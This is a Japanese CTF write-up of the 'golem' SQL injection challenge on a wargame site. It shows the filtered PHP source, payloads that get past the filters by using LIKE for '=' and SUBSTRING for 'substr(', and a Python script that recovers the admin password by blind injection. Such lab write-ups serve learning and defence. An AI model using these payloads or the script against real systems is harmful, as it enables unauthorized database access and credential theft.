# golem

## answer

- [golem](../src/golem.py)

## problem

```
query : select id from prob_golem where id='guest' and pw=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=1
```

とすると

```
query : select id from prob_vampire where id='1'
```

となった。

コードを読んでいく。

```
if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
```

これイコールも禁止されている気がするんだけど、

```
?pw=1' || '1' = '1
```

このイコールも"Hehe"になってしまうからダメ。

```
?pw=1'||'1
```

これを試してみる。

```
https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=1%27||%271

query : select id from prob_golem where id='guest' and pw='1'||'1'

Hello guest
```

とりあえずHello guestは出せた。

このあと、adminのpwを抜いてきたい。

やっぱりBlindSQLiかなと思ってはいるが、「=」がフィルターされていることを考えないといけない。

このような場合に、like句を活用できるらしい。

like句の使い方はこんな感じらしい。

```
SELECT * FROM employee WHERE name LIKE 'taro'
```

以上のように使うとlike句はイコールとして使うことができる、、、

```
?pw=' || length(pw) like 8 && id like 'admin
```

をurlエンコードしてから貼り付ける。

```
https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=%27%20%7C%7C%20length(pw)%20like%208%20%26%26%20id%20like%20%27admin

query : select id from prob_golem where id='guest' and pw='' || length(pw) like 8 && id like 'admin'

Hello admin
```

長さを変えながら試してたら、8でHello adminがでた。BlindSQLiで間違いなさそう。

また、「substr(」がフィルターされていることも考えないといけない。

MYSQLなら「substring」で代替できるかもしれない。

これでちょっと調べてみたい。

```
?pw=' || substring(pw, 1, 1) < 'A' && id like 'admin

?pw=' || substring(pw, 1, 1) > 'A' && id like 'admin
```

上のみHello adminを返す。

```
query : select id from prob_golem where id='guest' and pw='' || substring(pw, 1, 1) < 'A' && id like 'admin'

Hello admin
```

以上をふまえてコードを書いてみる。

```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='cgq355ag1vlid052btnp68fpo7')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 10):
        for char in chars:
            val = '\' || SUBSTRING(pw,{count},1) like \'{char}\' && id like \'admin'.format(count = count, char = char)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'Z':
                print("not found")
                return
    print(password)

if __name__ == "__main__":
    main()
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [addslashes | php manual](https://www.php.net/manual/ja/function.addslashes.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)

- [文字列関数 | mysql manual](https://dev.mysql.com/doc/refman/5.6/ja/string-functions.html)